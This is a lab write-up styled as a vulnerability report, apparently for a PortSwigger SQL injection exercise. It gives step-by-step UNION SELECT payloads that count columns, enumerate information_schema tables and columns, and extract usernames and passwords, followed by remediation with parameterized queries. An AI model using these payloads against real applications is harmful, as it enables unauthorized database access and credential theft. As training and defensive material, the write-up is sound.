
---
# SQL Injection in Product Filtering allows Retrieval of Database Contents

## 1. Executive Summary

A SQL injection vulnerability exists in the application's product filtering functionality, allowing attacker-controlled input to modify the underlying SQL query. By exploiting the injection point with a `UNION SELECT` statement, an attacker can query the database's `information_schema` metadata and enumerate database schemas, tables, and columns, ultimately retrieving data from application tables.

## 2. Vulnerability Details

- **Vulnerability Type:** SQL Injection (SQLi) — Database Enumeration and Data Extraction
    
- **Target Endpoint/URL:** `/filter`
    
- **Affected Parameter(s):** `category`
    
- **Authentication Level Required:** Unauthenticated
    

The application uses the `category` parameter in a SQL query similar to:

```
SELECT * FROM products
WHERE category = 'Gifts';
```

Because the parameter is vulnerable to SQL injection, an attacker can append a `UNION SELECT` statement and query database metadata.

For non-Oracle databases such as **MySQL** and **Microsoft SQL Server**, the `information_schema` database provides metadata about databases, tables, and columns.

For example:

```
SELECT * FROM information_schema.tables;
```

can be used to enumerate tables available to the database user.

## 3. Steps to Reproduce (STR)

### Step 1 — Identify the SQL injection point

1. Access the PortSwigger lab.
    
2. Navigate to the product filtering functionality.
    
3. Select a product category.
    
4. Intercept the request using Burp Suite.
    
5. Identify the `category` parameter.
    
6. Confirm that the parameter is vulnerable to SQL injection.
    

### Step 2 — Determine the number of columns

7. Test the parameter using `ORDER BY`:
    

```
' ORDER BY 1--
```

8. Increment the value:
    

```
' ORDER BY 2--
```

9. Continue until an error occurs.
    

Alternatively, use `UNION SELECT` with `NULL` values:

```
' UNION SELECT NULL--
```

```
' UNION SELECT NULL,NULL--
```

10. Determine the number of columns based on the payload that produces a successful response.
    

### Step 3 — Identify a text-compatible column

11. Test each column with a string value.
    

For a two-column query:

```
' UNION SELECT 'test',NULL--
```

and:

```
' UNION SELECT NULL,'test'--
```

12. Identify the column that displays `test` in the response.
    

### Step 4 — Enumerate database tables

13. Query the `information_schema.tables` view.
    

For example, if the first column is text-compatible:

```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

14. Send the request.
    
15. Examine the response for table names.
    

You may see tables such as:

```
users
products
orders
```

The exact table names depend on the lab database.

### Step 5 — Identify the relevant table

16. Examine the returned table names.
    
17. Identify the table containing application credentials or other sensitive information.
    
18. In this PortSwigger lab, the relevant table contains usernames and passwords.
    

### Step 6 — Enumerate the table's columns

19. Query `information_schema.columns` to identify the columns belonging to the target table.
    

For example:

```
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

20. Send the request.
    
21. Examine the response for column names.
    

For example:

```
username
password
```

### Step 7 — Retrieve the data

22. Once the relevant table and columns have been identified, query them using `UNION SELECT`.
    

For example:

```
' UNION SELECT username,password FROM users--
```

23. Send the request.
    
24. Observe that the application response contains the retrieved username and password values.
    
25. Use the credentials to complete the lab as instructed by PortSwigger.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

A conceptual request for table enumeration is:

```
GET /filter?category=%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

The injected SQL is conceptually:

```
SELECT * FROM products
WHERE category = ''
UNION
SELECT table_name, NULL
FROM information_schema.tables
--';
```

The application response may expose table names:

```
HTTP/1.1 200 OK
Content-Type: text/html

users
products
orders
...
```

After identifying the relevant table and columns, the attacker can retrieve the data:

```
' UNION SELECT username,password FROM users--
```

Conceptually:

```
SELECT * FROM products
WHERE category = ''
UNION
SELECT username, password
FROM users
--';
```

The response may then contain:

```
administrator
<password>
```

### MySQL vs Microsoft SQL Server

For **MySQL**, a `#` comment can also be used:

```
' UNION SELECT username,password FROM users#
```

For **Microsoft SQL Server**, use:

```
' UNION SELECT username,password FROM users--
```

For `--`, remember that MySQL requires appropriate whitespace/control-character syntax after the two hyphens.

### Evidence (Screenshots/Video)



## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can manipulate the application's SQL query, enumerate database metadata, identify application tables and columns, and retrieve data from database tables accessible to the application's database account.
    
- **Business Impact:** Successful exploitation can result in unauthorized disclosure of sensitive application data, including user credentials. In a real-world application, exposed credentials could enable account compromise, unauthorized access to privileged functionality, data theft, and further attacks against the organization.
    

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements for all database operations involving user-controlled input.
    

For example:

```
cursor.execute(
    "SELECT * FROM products WHERE category = %s",
    (category,)
)
```

Additional defenses include:

- Never concatenate user-controlled input directly into SQL statements.
    
- Use prepared statements/parameterized queries.
    
- Apply least-privilege permissions to the application's database account.
    
- Restrict the database user's ability to access unnecessary schemas and tables.
    
- Avoid returning database errors or internal metadata to users.
    
- Implement appropriate server-side input validation as defense in depth.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - PortSwigger Web Security Academy — SQL Injection